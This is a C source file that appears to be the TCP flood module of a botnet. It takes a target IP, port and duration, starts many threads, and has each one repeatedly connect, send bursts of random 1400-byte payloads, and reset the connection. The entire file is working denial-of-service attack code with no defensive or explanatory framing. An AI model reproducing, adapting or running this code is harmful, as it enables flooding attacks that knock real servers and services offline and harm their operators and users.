#include "../../bot.h"
#include "l4.h"
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

void *tcp_worker(void *arg) {
    target_t *t = arg;
    struct sockaddr_in addr;
    addr.sin_family = AF_INET; addr.sin_port = htons(t->port);
    inet_pton(AF_INET, t->ip, &addr.sin_addr);
    XorShift64 *rng = rng_new();
    uint8_t payload[1400];
    rng_fill(rng, payload, 1400);
    time_t end = time(NULL) + t->sec;
    while (time(NULL) < end && running) {
        int fd = socket(AF_INET, SOCK_STREAM, 0);
        if (fd < 0) continue;
        struct timeval tv = {5, 0};
        setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
        if (connect(fd, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
            close(fd); sleep_ms(10); continue;
        }
        int bursts = 50 + (int)(rng_next(rng) % 200);
        for (int j = 0; j < bursts; j++) {
            if (write(fd, payload, 1400) <= 0) break;
        }
        struct linger l = {1, 0};
        setsockopt(fd, SOL_SOCKET, SO_LINGER, &l, sizeof(l));
        close(fd);
    }
    free(rng);
    return NULL;
}

void flood_tcp(const char *target, int port, int sec) {
    target_t t; if (resolve_target(&t, target) < 0) return;
    t.port = port; t.sec = sec;
    int n = g_thread_count;
    pthread_t threads[n];
    for (int i = 0; i < n; i++)
        pthread_create(&threads[i], NULL, tcp_worker, &t);
    for (int i = 0; i < n; i++)
        pthread_join(threads[i], NULL);
}
